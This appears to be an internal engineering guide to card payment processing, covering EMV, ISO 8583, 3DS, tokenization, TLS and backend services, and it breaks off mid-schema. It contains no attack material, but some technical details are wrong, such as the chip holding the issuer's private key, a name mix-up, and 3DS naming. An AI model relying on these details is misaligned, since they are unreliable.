# Card Transaction Processing System — Internal Engineering & Security Document

**Classification:** CONFIDENTIAL — Internal Engineering Reference  
**Audience:** All Engineers (Beginner to Senior), Security Engineers, Payment System Architects  
**Scope:** Complete breakdown of how a credit/debit card transaction flows from swipe/tap/click to authorization, settlement, and reconciliation  
**Regulatory context:** PCI DSS v4.0, EMV standards, ISO 8583, ISO 20022, GDPR

---

## A Beginner's Orientation: The Five Parties in Every Card Transaction

Before diving deep, understand that every card transaction involves exactly these parties:

1. **Cardholder** — The person paying (you, with your Visa/Mastercard/Amex card)
2. **Merchant** — The business being paid (Amazon, your local grocery store)
3. **Acquirer** — The merchant's bank (the bank that gave the merchant their card terminal and business account). Also called the "acquiring bank."
4. **Card Network** — The rails the data travels on (Visa, Mastercard, American Express, Discover). They set the rules, not the money.
5. **Issuer** — The cardholder's bank (Chase, HDFC, Barclays — whoever issued your card). They hold your money and decide if the transaction is approved.

**The money flow and the data flow are separate:**
- Data travels instantly (milliseconds): Merchant → Acquirer → Card Network → Issuer → back
- Money moves slowly (1-3 business days for settlement): Issuer → Card Network → Acquirer → Merchant

This document covers both flows in their full complexity.

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### The Three Card Transaction Scenarios

We cover three scenarios that share core infrastructure but differ in security characteristics:

**Scenario A — Card Present (CP): Chip & PIN at a physical terminal**  
**Scenario B — Card Not Present (CNP): Online purchase with card number**  
**Scenario C — Contactless: Tap-to-pay (NFC)**

---

### Scenario A: Chip & PIN at a Physical POS Terminal

**Context:** Alice buys groceries at FreshMart. Total: $47.23. She inserts her Chase Visa card.

---

#### T+0ms — Card Inserted

Alice inserts her chip card into the Point-of-Sale (POS) terminal. What actually happens at the hardware level:

The terminal's card reader physically contacts the chip on the card. The chip is an EMV (Europay, Mastercard, Visa) microprocessor that has never been extracted from the card — it's a tiny computer embedded in the plastic.

**Card chip anatomy:**
```
+------------------------------------------+
|  EMV CHIP CONTENTS                        |
|  - Permanent application (cannot change): |
|    · Primary Account Number (PAN)         |
|    · Expiry date                          |
|    · Card sequence number                 |
|    · Issuer-specific data                 |
|                                           |
|  - Cryptographic keys (never exported):   |
|    · Issuer private key (asymmetric)      |
|    · ICC (Integrated Circuit Card) key    |
|                                           |
|  - Counters (increment each use):         |
|    · Application Transaction Counter (ATC)|
|      ATC = 0x0023 means 35th use of card |
|                                           |
|  - Card risk management data:             |
|    · Consecutive offline limit            |
|    · Card floor limits                    |
+------------------------------------------+
```

**Why chip beats magnetic stripe:** A magnetic stripe is like a cassette tape — read-only static data that never changes. Anyone who reads it once can clone it infinitely. The chip performs cryptographic operations — it computes a unique cryptogram for every single transaction that can never be reused.

---

#### T+0 to T+100ms — EMV Application Selection

The POS terminal and chip negotiate:

1. Terminal sends: "SELECT PPSE" (Payment Processing Selection Environment) — basically saying "what payment apps do you support?"
2. Chip responds: "I support Visa Credit (application ID A0000000031010) and Visa Debit (A0000000032010)"
3. Terminal selects Visa Credit (or whichever matches the merchant's acquirer)
4. Terminal sends: "SELECT [application ID]"
5. Chip responds with card profile: PAN, expiry, service codes, supported functions

---

#### T+100ms to T+300ms — Transaction Initiation & Cryptogram Generation

The terminal sends transaction details to the chip:
```
Amount: $47.23
Currency: USD (840)
Country: USA (840)
Terminal Verification Results: 0x0000000000
Transaction Date: 20241115
Transaction Type: Purchase (00)
Unpredictable Number: 0x3A7F9C1B  ← CRITICAL: random value from terminal
```

**The Unpredictable Number is crucial for security.** It's a 4-byte random number generated by the terminal for this specific transaction. It prevents replay attacks — even if someone captured this entire transaction's data, the cryptogram computed with this unpredictable number is worthless for any future transaction.

The chip computes the **Application Cryptogram (AC)** using TRIPLE-DES:

```
ARQC = TRIPLE-DES(
  transaction_data  || amount || currency || date ||
  ATC (counter)     || unpredictable_number,
  issuer_master_key_diversified_for_this_card
)
```

**ARQC = Authorization Request Cryptogram.** This 8-byte value is the chip's "signed approval" of this transaction. The issuer bank can verify it because the issuer holds the same master key used to compute it.

---

#### T+300ms — Terminal Prompts for PIN

Terminal displays: "ENTER PIN"

Alice types: 1234

The PIN is processed by the PIN pad — a tamper-resistant hardware device. The PIN pad:
1. Collects Alice's keystrokes (not the main terminal processor — separate secure hardware)
2. Encrypts the PIN immediately: `ENCRYPTED_PIN = DES(PIN_BLOCK, PIN_ENCRYPTION_KEY)`
3. The PIN encryption key (PEK) is injected into the PIN pad at the factory — it never appears in plaintext outside the PIN pad's secure element
4. Only the issuer bank (Chase) can decrypt this with the corresponding key stored in their HSM

What the terminal main processor sees: an encrypted blob. Not the PIN.

---

#### T+500ms to T+1s — Authorization Request (ISO 8583 Message)

The POS terminal constructs an ISO 8583 financial message. ISO 8583 is a binary message standard used globally for card transactions. Think of it as the "language" all financial systems speak.

**ISO 8583 Message Structure:**

```
+----------------------------------------------------------+
| MESSAGE TYPE INDICATOR (MTI)  | 2 bytes  |              |
|  0100 = Authorization Request |          |              |
+----------------------------------------------------------+
| BITMAP                        | 8 bytes  |              |
|  Bits indicate which fields  |          |              |
|  are present in the message  |          |              |
+----------------------------------------------------------+
| FIELD 2:  PAN                 | Variable | 4111111111111111 |
| FIELD 3:  Processing Code     | 6 digits | 000000 (purchase)|
| FIELD 4:  Amount              | 12 digits| 000000004723     |
| FIELD 7:  Transmission Date/Time| 10 dig | 1115103045       |
| FIELD 11: System Trace Audit# | 6 digits | 123456           |
| FIELD 12: Local Time          | 6 digits | 103045           |
| FIELD 13: Local Date          | 4 digits | 1115             |
| FIELD 14: Expiration Date     | 4 digits | 2611 (Nov 2026)  |
| FIELD 18: Merchant Category Code| 4 dig  | 5411 (Grocery)   |
| FIELD 22: POS Entry Mode      | 3 digits | 051 (Chip+PIN)   |
| FIELD 35: Track 2 Data        | Variable | (from chip)       |
| FIELD 37: Retrieval Ref #     | 12 chars | 411522987654      |
| FIELD 41: Terminal ID         | 8 chars  | TERM0001          |
| FIELD 42: Merchant ID         | 15 chars | FRESHMART0001     |
| FIELD 49: Currency Code       | 3 digits | 840 (USD)         |
| FIELD 55: EMV Data            | Variable | ARQC + chip data  |
+----------------------------------------------------------+
```

**Field 55 (EMV Data) contains the cryptogram** — this is where the chip's security signature lives, and it's the single most important innovation in card security.

This message travels from the POS terminal → Acquirer → Card Network → Issuer.

---

#### T+1s to T+2s — Authorization at the Issuer

Chase (the issuer) receives the ISO 8583 authorization request. Chase's authorization system performs:

**1. Card validation:**
- Is PAN in database? (Yes)
- Is card expired? (No, 11/2026)
- Is card blocked/stolen? (Check against hot-card file — a list of compromised cards)

**2. ARQC verification (cryptogram validation):**
- Chase's HSM has the same issuer master key
- Chase computes what the ARQC *should be* for this transaction
- Compares with received ARQC
- If they match: the chip is genuine (not cloned), and the transaction data is authentic

**3. PIN validation:**
- Chase's HSM decrypts the encrypted PIN block
- Compares with stored PIN (also HSM-protected)
- Result: PIN correct / incorrect

**4. Risk and fraud checks:**
- Balance available? ($47.23 against available credit: $3,500 — yes)
- Velocity check: Has this card been used suspiciously frequently today?
- Geolocation: Card used in Austin, TX — was it used in London 2 minutes ago? (impossible travel)
- ML fraud model: Score this transaction based on 200+ features
- Merchant category: Grocery store (normal for this cardholder)

**5. Authorization decision:**
Chase responds with an ISO 8583 response (MTI 0110):

```
FIELD 38: Authorization Code    | 6 chars  | AUTH47  ← Gold standard, approved
FIELD 39: Response Code         | 2 chars  | 00      ← 00 = Approved
FIELD 55: EMV Response Data     | Variable | ARPC + issuer response data
```

**ARPC = Authorization Response Cryptogram** — the issuer's cryptographic proof that IT authenticated the request. The chip verifies this to confirm the response came from the real bank, not an interceptor.

---

#### T+2s to T+3s — Terminal Receives Response

The authorization approval travels back: Issuer → Card Network → Acquirer → POS Terminal.

Terminal displays: **"APPROVED — $47.23"**

The terminal prints a receipt. Alice gets her groceries. The transaction is complete from Alice's perspective.

**But the transaction is NOT over financially.** Authorization reserves the funds — it doesn't move them. That's settlement.

---

#### T+24 to T+72 hours — Settlement (Batch Processing)

At end of business day, FreshMart's acquirer collects all day's authorized transactions and sends a settlement batch to the card network. This is called "clearing."

The card network routes settlement to each issuer. Issuers transfer actual funds. This is where money really moves.

**Why the delay?** Settlement involves netting — if Visa processed 10 million transactions today between Chase-to-Wells-Fargo and Wells-Fargo-to-Chase, they net the amounts and only one wire transfer moves the difference. This is far more efficient than individual transfers.

---

### Scenario B: Online Purchase (Card Not Present)

**Context:** Bob buys a book at Amazon.com. He enters his Mastercard details on the website.

The fundamental difference: **there is no EMV chip.** No cryptogram can be generated. The entire security model changes.

**What Amazon receives from Bob's browser:**
- Card number (PAN): 5111111111111111
- Expiry date: 11/2026
- CVV2/CVC2: 123 (3-digit code on back of card)
- Billing ZIP code: 78701

**Why CNP is riskier:**
In a CP transaction, the chip cryptogram proves physical card presence + correct PIN proves cardholder presence. In CNP, anyone who knows the card number + expiry + CVV can attempt a transaction. These 19 digits are all that stand between a criminal and successful fraud.

This is why e-commerce has higher fraud rates (~10x) compared to in-person card present transactions.

**What Amazon's checkout system sends to its payment processor (Stripe/Braintree/etc.):**
```json
{
  "amount": 2999,
  "currency": "usd",
  "card": {
    "number": "5111111111111111",
    "exp_month": 11,
    "exp_year": 2026,
    "cvc": "123"
  },
  "billing_details": {
    "name": "Bob Smith",
    "address": {
      "line1": "123 Main St",
      "city": "Austin",
      "state": "TX",
      "postal_code": "78701",
      "country": "US"
    }
  }
}
```

**3D Secure (3DS2) — The CNP security upgrade:**

For high-risk transactions, Amazon triggers 3DS2. Mastercard's Secure Code or Visa's Verified by Visa. In 3DS2:
1. Amazon's payment page loads an invisible iframe from the card network
2. The iframe collects browser fingerprint, device data
3. This data is sent to the issuer's access control server
4. Issuer makes a risk decision: approve without challenge, or step up
5. If step-up: cardholder sees "Enter the OTP sent to your phone ending in 7890"
6. Cardholder enters OTP → issuer verifies → authentication complete
7. This shifts fraud liability from merchant to issuer

Without 3DS: merchant liability for fraud chargebacks.  
With 3DS + cardholder authenticated: issuer liability.

---

### Scenario C: Contactless (NFC Tap)

**Context:** Carol taps her iPhone (Apple Pay) to pay at Starbucks. $6.50.

**Key difference from chip:** Contactless uses NFC (Near Field Communication) radio, works at 13.56 MHz, within 4cm. But more importantly — Apple Pay uses **tokenization**.

Alice's actual card number (PAN): 4111111111111111 (never stored on phone)

iPhone stores a **DPAN (Device PAN)**: 4900111222333444 — a fake card number that only works on this specific device, for Apple Pay transactions.

When Carol taps:
1. iPhone generates a transaction-specific **cryptogram** (like EMV chip)
2. The DPAN (not the real PAN) is transmitted
3. Terminal sends DPAN + cryptogram to acquirer
4. Card network (Visa) sees DPAN, knows it maps to PAN 4111111111111111
5. Card network translates to real PAN before sending to Chase (issuer)
6. Chase sees the real PAN for authorization

**Why tokenization is powerful:**
- If the merchant's terminal is hacked, criminals get DPAN 4900111222333444
- This DPAN only works on Carol's iPhone, only for contactless NFC
- It cannot be used at another terminal or online
- Carol's real card number is never exposed

---

## 2. Network Layer Flow

### The Physical Infrastructure

**For card present transactions:** POS terminals connect to acquirers via:
- **Dedicated leased lines** (tier-1 merchants, banks)
- **IP over TLS** through the merchant's internet connection (common for small merchants)
- **Dialup PSTN** (legacy, rare in developed markets but still present)
- **GPRS/4G** (mobile terminals, outdoor markets)

**For online transactions:** Standard internet infrastructure — browser to payment processor's servers.

**The card networks' backbone:** Visa and Mastercard operate private global networks (VisaNet, Banknet). These are not the public internet. They use dedicated fiber connections between their data centers, connecting to banks via direct private circuits or through certified network service providers.

---

### DNS Resolution for the Online Payment Flow

When Bob's browser contacts Amazon's payment processor:

```
Bob's Browser
     |
     | DNS Query: "api.stripe.com → what IP?"
     v
Browser DNS Cache → OS Cache → Recursive Resolver (ISP / 8.8.8.8)
     |
     | Cache MISS
     v
Root Nameserver (.)
     | "Ask .com TLD servers"
     v
.com TLD Nameserver (Verisign)
     | "Ask Stripe's authoritative nameservers: ns1.stripe.com"
     v
Stripe's Authoritative NS
     | Returns: A record → 54.187.174.169
     | TTL: 300 seconds (5 minutes — short for fast failover)
     v
Recursive Resolver caches, returns to browser
     v
Bob's browser: api.stripe.com = 54.187.174.169

Total DNS time: 20-100ms (cold) / 0ms (cached)
```

**Why payment processors use short TTLs:** If Stripe needs to shift traffic to a different data center during an incident, a short TTL means all clients pick up the new IP within 5 minutes. With a 1-hour TTL, some users would keep hitting a dead server for up to an hour.

**Anycast DNS:** Stripe uses anycast — the same IP address is advertised from multiple data centers worldwide. BGP routing automatically directs your DNS query to the nearest Stripe edge. A user in Singapore gets an edge node in Singapore; a user in London gets a European edge node.

---

### TCP 3-Way Handshake

```
Bob's Browser (49.36.x.x:54321)          Stripe Server (54.187.174.169:443)
           |                                              |
           |  SYN [seq=1000]                              |
           |  MSS=1460, SACK_PERM, WS=128                |
           | -------------------------------------------> |
           |                                              |
           |  SYN-ACK [seq=5000, ack=1001]               |
           |  MSS=1460, SACK_PERM, WS=256                |
           | <------------------------------------------- |
           |                                              |
           |  ACK [ack=5001]                              |
           | -------------------------------------------> |
           |                                              |
           |  [TCP established — took 1 RTT]             |
           |  [TLS handshake starts immediately]         |
```

**MSS (Maximum Segment Size):** 1460 bytes — the maximum payload per TCP segment for standard Ethernet (1500 byte MTU minus 20 bytes IP header minus 20 bytes TCP header).

**SACK (Selective Acknowledgment):** If a packet is lost in a burst, SACK lets the receiver tell the sender exactly which packets arrived. Without SACK, the sender must retransmit everything from the lost packet onward.

**Why this RTT matters for payments:** Every network round-trip adds latency. A user in Mumbai connecting to Stripe's US servers has ~200ms RTT. That's 200ms just for TCP establishment, another 200ms for TLS, before a single byte of actual payment data has been exchanged. This is why payment processors deploy globally — they want users connecting to geographically close servers.

---

### TLS 1.3 Handshake

For payment systems, TLS is not optional. The card data must be encrypted. PCI DSS mandates TLS 1.2+ (TLS 1.0 and 1.1 are explicitly prohibited).

```
Browser (TLS Client)                         Stripe (TLS Server)
       |                                            |
       | ClientHello                                |
       | - max_version: TLS 1.3                     |
       | - cipher_suites:                           |
       |   TLS_AES_256_GCM_SHA384 (preferred)       |
       |   TLS_AES_128_GCM_SHA256                   |
       |   TLS_CHACHA20_POLY1305_SHA256             |
       | - extensions:                              |
       |   key_share: X25519 ECDH pub key (32B)    |
       |   SNI: "api.stripe.com"                    |
       |   ALPN: ["h2", "http/1.1"]                 |
       |   session_ticket: (for 0-RTT resumption)  |
       | ------------------------------------------> |
       |                                            |
       | ServerHello                                |
       | - selected: TLS 1.3                        |
       | - cipher: TLS_AES_256_GCM_SHA384           |
       | - key_share: server's X25519 pub key (32B) |
       |                                            |
       | {EncryptedExtensions}                      |
       | {Certificate}                              |
       |  - Subject: api.stripe.com                 |
       |  - SAN: *.stripe.com                       |
       |  - Issuer: DigiCert EV RSA CA              |
       |  - Public key: EC P-256 256-bit            |
       |  - OCSP staple: valid                      |
       |  - CT logs: Google Argon, Let's Encrypt    |
       | {CertificateVerify}                        |
       | {Finished}                                 |
       | <------------------------------------------ |
       |                                            |
       | [Browser validates certificate]            |
       | [Derives session keys from ECDH shared secret]
       | {Finished}                                 |
       | ------------------------------------------> |
       |                                            |
       | [Application data can now flow]            |
       | POST /v1/payment_intents/create            |
       | {card data, amount, ...}                   |
       | ------------------------------------------> |
```

**Why AES-256-GCM specifically?**
- AES = Advanced Encryption Standard, block cipher
- 256 = 256-bit key (2^256 possible keys — breaking this would require more energy than the sun produces in millions of years)
- GCM = Galois/Counter Mode: provides both encryption AND authentication in one pass
- The "G" in GCM means an attacker can't modify the ciphertext without detection

**ECDH X25519 key exchange:**
- ECDH = Elliptic Curve Diffie-Hellman — allows two parties to establish a shared secret over an insecure channel without ever transmitting the secret
- X25519 = uses Curve25519, designed by Dan Bernstein, resistant to side-channel attacks
- **Perfect Forward Secrecy (PFS):** New ephemeral keys are generated for every session. If Stripe's long-term private key is ever stolen, past recorded traffic cannot be decrypted because each session had its own keys that were never persisted

---

### Full Network Flow Diagram

```
ALICE's PHONE/POS                ACQUIRER           CARD NETWORK       ISSUER (CHASE)
(Physical Card)                 (FreshMart's Bank)  (Visa VisaNet)
     |                               |                    |                 |
  [Card inserted]                    |                    |                 |
  [EMV negotiation]                  |                    |                 |
  [Cryptogram generated]             |                    |                 |
  [PIN encrypted]                    |                    |                 |
     |                               |                    |                 |
  ISO 8583 0100                      |                    |                 |
  [via TLS/leased line]              |                    |                 |
  ─────────────────────────────────>|                    |                 |
                                     | ISO 8583 0100      |                 |
                                     | [via private       |                 |
                                     |  VisaNet link]     |                 |
                                     |─────────────────── >|                |
                                     |                    | ISO 8583 0100   |
                                     |                    | [internal       |
                                     |                    |  network]       |
                                     |                    |───────────────> |
                                     |                    |                 | [Check card]
                                     |                    |                 | [Verify ARQC]
                                     |                    |                 | [Check PIN]
                                     |                    |                 | [Fraud score]
                                     |                    |                 | [Check balance]
                                     |                    | ISO 8583 0110   |
                                     |                    | Response Code 00|
                                     |                    | Auth Code AUTH47|
                                     |                    | ARPC data       |
                                     |                    |<─────────────── |
                                     | ISO 8583 0110      |                 |
                                     |<─────────────────── |                |
  ISO 8583 0110                      |                    |                 |
  [APPROVED]                         |                    |                 |
  <─────────────────────────────────|                    |                 |
     |                               |                    |                 |
  [Display: APPROVED $47.23]         |                    |                 |
  [Print receipt]                    |                    |                 |
  [Card removed]                     |                    |                 |
                                     |                    |                 |
  [END OF REAL-TIME FLOW]            |                    |                 |
                                     |                    |                 |
  [SETTLEMENT — HOURS LATER]         |                    |                 |
                                     | ISO 8583 0220      |                 |
                                     | [Clearing batch]   |                 |
                                     |──────────────────> |                 |
                                     |                    |──────────────── >|
                                     |                    |                 | [Transfer funds]
                                     |                    |    Funds wire   |
                                     |                    |<─────────────── |
                                     |    Funds wire      |                 |
                                     |<─────────────────── |                |
  [Merchant account credited]        |                    |                 |
```

### Latency Budget for Card Authorization

| Hop | Protocol | Typical Latency | Notes |
|---|---|---|---|
| POS → Acquirer | TLS/IP or leased line | 20–50ms | Local network |
| Acquirer → VisaNet | Private circuit | 5–20ms | Dedicated fiber |
| VisaNet routing | Internal | 1–5ms | Extremely fast internal routing |
| VisaNet → Issuer | Private circuit | 5–20ms | Dedicated fiber |
| Issuer processing | Internal systems | 50–300ms | Fraud scoring + HSM operations |
| Return path | Same as above reversed | Same | Symmetric |
| **Total** | | **~200–800ms** | |

**Why the issuer takes 50–300ms:** The fraud ML model is computationally expensive. Running 200+ features through an ensemble model, checking the hot-card file, validating the ARQC in an HSM, checking account balance — all of this must happen in ~100ms or customers get annoyed. Banks invest heavily in optimizing this pipeline.

---

## 3. Application Layer Flow

### For Card-Present (POS) Transactions

POS terminals don't use HTTP — they use ISO 8583 or ISO 20022 over TCP/TLS. Understanding this is critical because it's completely different from web APIs.

**ISO 8583 message flow:**

```
Terminal to Acquirer:
  - MTI 0100 = Financial Transaction Request (authorization)
  - MTI 0200 = Financial Transaction Request (completion)
  - MTI 0400 = Reversal Request
  - MTI 0800 = Network Management Request (keep-alive/sign-on)

Acquirer to Terminal:
  - MTI 0110 = Response to 0100
  - MTI 0210 = Response to 0200
  - MTI 0410 = Response to 0400
  - MTI 0810 = Response to 0800
```

**Fixed-length binary message (no JSON, no XML by default):**

The binary structure means:
- No ambiguity about field boundaries (positions are fixed or length-prefixed)
- Extremely compact (100-200 bytes for a typical auth request vs. 500-2000 bytes for JSON)
- Very fast to parse (no text parsing, direct memory mapping)
- Requires exact knowledge of the spec to read (not human-readable)

---

### For Online Card Transactions (REST API)

When an e-commerce merchant uses Stripe/Adyen/Braintree, the API is HTTP/2 REST with JSON.

**Actual request to Stripe's API:**

```http
POST /v1/payment_intents HTTP/2
Host: api.stripe.com
Authorization: Bearer sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz...
Content-Type: application/x-www-form-urlencoded
Stripe-Version: 2023-10-16
Idempotency-Key: a8098c1a-f86e-11da-bd1a-00112444be1e
Content-Length: 384

amount=2999&
currency=usd&
payment_method_data[type]=card&
payment_method_data[card][number]=5111111111111111&
payment_method_data[card][exp_month]=11&
payment_method_data[card][exp_year]=2026&
payment_method_data[card][cvc]=123&
confirm=true&
capture_method=automatic&
metadata[order_id]=ORD-2024-78901
```

**Why `application/x-www-form-urlencoded` instead of JSON?** Stripe's v1 API uses URL-encoded form data (a legacy decision from when Stripe launched in 2010). Their v2 API uses JSON. Many payment APIs still use form encoding for historical compatibility reasons.

**The `Idempotency-Key` header:** If the network drops after Stripe processes the payment but before the response reaches the merchant, the merchant might retry. Without idempotency, this causes a double charge. With the idempotency key, Stripe detects the retry and returns the original response without charging again.

```python
# Idempotency key generation (at merchant):
import uuid
idempotency_key = str(uuid.uuid4())
# e.g., "a8098c1a-f86e-11da-bd1a-00112444be1e"

# Store this key with the order BEFORE making the API call
# If the API call needs to be retried, use the SAME key
# Stripe will return the cached result
```

---

### How Parameters Are Parsed and Validated

At Stripe's API server receiving the card number:

```python
def parse_card_number(raw_value: str) -> str:
    # Step 1: Type check
    if not isinstance(raw_value, str):
        raise ValidationError("card.number must be a string")

    # Step 2: Strip whitespace and spaces (users often type 4111 1111 1111 1111)
    cleaned = raw_value.replace(" ", "").replace("-", "")

    # Step 3: Length check
    if len(cleaned) < 13 or len(cleaned) > 19:
        raise ValidationError("Invalid card number length")

    # Step 4: Numeric check
    if not cleaned.isdigit():
        raise ValidationError("Card number must contain only digits")

    # Step 5: Luhn algorithm check
    if not luhn_check(cleaned):
        raise ValidationError("Invalid card number (checksum failed)")

    # Step 6: BIN (first 6-8 digits) identification
    bin_number = cleaned[:8]
    card_info = bin_database.lookup(bin_number)
    # Returns: card_brand, issuer, card_type, country

    return cleaned  # Return stripped version

def luhn_check(number: str) -> bool:
    """Luhn algorithm — validates card number checksum."""
    digits = [int(d) for d in number]
    # Double every second digit from right, subtract 9 if > 9
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return sum(digits) % 10 == 0
```

**The Luhn algorithm** was designed in 1954 by Hans Peter Luhn at IBM to detect typos in card numbers. It's not cryptographic — it's just a checksum. But it catches ~90% of single-digit mistakes (typing 4111111111111112 instead of 4111111111111111 would fail the Luhn check).

---

### Response Construction

**Successful authorization response from Stripe:**

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Request-Id: req_1234567890AbCdEf
Stripe-Version: 2023-10-16
Cache-Control: no-cache, no-store

{
  "id": "pi_3QFoo1234567890AbCdEf",
  "object": "payment_intent",
  "amount": 2999,
  "currency": "usd",
  "status": "succeeded",
  "charges": {
    "data": [{
      "id": "ch_3QFoo1234567890GhIjKl",
      "amount": 2999,
      "authorization_code": "AUTH47",
      "outcome": {
        "network_status": "approved_by_network",
        "reason": null,
        "risk_level": "normal",
        "risk_score": 23,
        "type": "authorized"
      },
      "payment_method_details": {
        "card": {
          "brand": "mastercard",
          "checks": {
            "address_line1_check": null,
            "address_postal_code_check": "pass",
            "cvc_check": "pass"
          },
          "last4": "1111",
          "exp_month": 11,
          "exp_year": 2026,
          "fingerprint": "Wd3drhHnkBwsIBpg",
          "network": "mastercard"
        }
      }
    }]
  }
}
```

**What's returned vs. what's not:**
- ✓ Last 4 digits of card (safe to store and display)
- ✓ Card brand and expiry (safe to display)
- ✓ A fingerprint of the full PAN (for de-duplication — hashed, cannot be reversed)
- ✗ Full PAN — never returned after tokenization
- ✗ CVV — never stored or returned (PCI DSS prohibition)

---

## 4. Backend Architecture

### The Full Processing Stack

```
MERCHANT SIDE                 PAYMENT PROCESSOR         CARD NETWORKS      ISSUER SIDE
+------------------+         +-------------------+      +-------------+    +------------------+
| E-commerce App   |         |                   |      |             |    |                  |
| (React/Node.js)  |         | API Gateway       |      | Visa        |    | Authorization    |
| Stripe.js SDK    |-------> | (nginx/Envoy)     |      | VisaNet     |    | Engine           |
+------------------+         |        |          |      |             |    |        |         |
                              | Auth Service      | <--> | Mastercard  | -> | HSM Cluster      |
                              | Card Tokenizer    |      | Banknet     |    |        |         |
                              | Risk Engine       |      |             |    | Core Banking     |
                              | ISO 8583 Gateway  |      | Amex        |    | System (CBS)     |
                              |        |          |      | ExpressNet  |    |        |         |
                              | Kafka Event Bus   |      +-------------+    | Fraud Engine     |
                              |        |          |                         |        |         |
                              | Settlement Svc    |                         | Notification     |
                              | Dispute Svc       |                         | Service          |
                              | Reporting Svc     |                         +------------------+
                              +-------------------+
                                       |
                              +--------+--------+
                              |                 |
                         PostgreSQL           Redis
                         (primary store)     (cache,
                                             sessions,
                                             rate limits)
```

### Key Services and Their Responsibilities

**1. API Gateway (nginx/Envoy)**
- TLS termination (handles the encryption/decryption for HTTPS)
- Rate limiting (prevents abuse)
- Authentication header validation (API key present?)
- Request routing to appropriate microservice
- DDoS protection (drop floods before they hit application code)

**2. Card Tokenizer**
The most security-critical service. Takes the raw card number and replaces it with a token.

```
Input:  PAN = "5111111111111111"
Output: Token = "tok_1A2b3C4d5E6f7G8h"

The token:
- Is a random string, not derived from the PAN
- Cannot be reversed (no algorithm to get PAN from token)
- Maps to PAN via a lookup table in an HSM-protected vault
- Is scoped (token valid only for this merchant, this amount, etc.)

Token vault storage:
{token: "tok_1A2b3C4d5E6f7G8h"} → {pan: ENCRYPTED(PAN), metadata}
The PAN in the vault is encrypted with HSM-protected keys.
```

**Why tokenization changes everything for PCI compliance:**
If a merchant stores `tok_1A2b3C4d5E6f7G8h` and their database is breached:
- Attacker gets a token
- Token is useless outside the tokenization system
- Merchant's PCI scope is dramatically reduced

**3. Risk Engine**
Runs 50-200 features through an ML model in <50ms. Features include:

```python
RISK_FEATURES = {
    # Card-level features
    "card_age_days": days_since_card_issued,
    "card_country": "US",  # vs. transaction country
    "card_type": "CREDIT",  # credit riskier than debit for CNP

    # Transaction features
    "amount": 29.99,
    "is_round_number": False,
    "hour_of_day": 14,  # 2 PM — normal
    "day_of_week": 1,   # Monday

    # Behavioral features
    "txn_count_1h": 2,   # normal
    "txn_amount_sum_24h": 127.43,
    "distinct_merchants_7d": 8,
    "is_new_merchant": True,

    # Device/network features
    "ip_country": "US",
    "ip_is_vpn": False,
    "ip_is_tor": False,
    "device_fingerprint_age": 45,  # days — established device

    # Velocity features
    "attempts_on_pan_1h": 1,  # normal
    "declines_on_pan_24h": 0,  # no recent declines

    # Merchant features
    "merchant_category_code": 5942,  # Bookstores
    "merchant_fraud_rate_90d": 0.002,  # 0.2% — low

    # Historical features
    "user_lifetime_value": 2340.00,
    "days_since_first_txn": 730,
    "avg_txn_amount": 45.20
}

risk_score = xgboost_model.predict(RISK_FEATURES)
# 0 = definitely legit
# 100 = definitely fraud
```

**4. ISO 8583 Gateway**
Translates between internal JSON/protobuf representation and the binary ISO 8583 format required by card networks.

```python
def json_to_iso8583(payment_request: dict) -> bytes:
    msg = ISO8583Message()
    msg.set_mti("0100")  # Authorization Request
    msg.set_field(2, payment_request["pan"])
    msg.set_field(3, "000000")  # Purchase
    msg.set_field(4, payment_request["amount_cents"].zfill(12))
    msg.set_field(7, datetime.utcnow().strftime("%m%d%H%M%S"))
    msg.set_field(11, generate_stan())  # System Trace Audit Number
    msg.set_field(22, "012")  # POS entry mode: keyed (CNP)
    msg.set_field(37, generate_rrn())  # Retrieval Reference Number
    msg.set_field(41, payment_request["terminal_id"])
    msg.set_field(42, payment_request["merchant_id"])
    msg.set_field(49, "840")  # USD
    return msg.encode()  # Binary output
```

**5. Settlement Service**
Runs as a batch process (typically multiple times per day, e.g., 6 AM, 12 PM, 6 PM). Aggregates authorized transactions and submits clearing files to card networks.

---

### Database Architecture

**The Three-Database Pattern:**

```
Database 1: Operational DB (PostgreSQL)
  - Transaction records (status, amounts, references)
  - Merchant records
  - Tokenized card references (NOT raw PANs)
  - High IOPS, hot data, fully indexed
  - PCI-scoped (strict access control)

Database 2: Audit Log (Append-Only, PostgreSQL/Cassandra)
  - Immutable record of every event in the transaction lifecycle
  - No UPDATEs, no DELETEs
  - Required by PCI DSS for audit trail
  - Retained 7+ years per regulations

Database 3: HSM-Protected Token Vault
  - Maps tokens → encrypted PANs
  - HSM holds encryption keys
  - Most restricted system in the stack
  - Separate physical hardware
  - Air-gapped from regular network
  - Every access logged with who/what/when
```

**PostgreSQL schema (simplified):**

```sql
CREATE TABLE transactions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  merchant_id VARCHAR(50) NOT NULL,
  amount_cents BIGINT NOT NULL CHECK (amount_cents > 0),
  currency CHAR(3) NOT NULL DEFAULT 'usd',
  status VARCHAR(20) NOT NULL DEFAULT 'pending',
  -- status: pending, authorized, captured, refunded, voided, declined
  card_token VARCHAR(100) NOT NULL,  -- tok_xxxxx, NOT the PAN
  card_last4 CHAR(4) NOT NULL,       -- "1111" — safe to store
  card_brand VARCHAR(20) NOT NULL,   -- "visa", "mastercard"
  card_exp_month SMALLINT NOT NULL,
  card_exp_year SMALLINT NOT NULL,
  card_fingerprint VARCHAR(64),       -- SHA-256 hash of PAN (for dedup)
  auth_code VARCHAR(20),              -- "AUTH47" from issuer
  network_transaction_id VARCHAR(100), -- Visa/Mastercard's ID
  retrieval_reference_no VARCHAR(50), -- RRN for disputes
  avs_result CHAR(1),                -- Address verification result
  cvv_result CHAR(1),                -- CVV check result
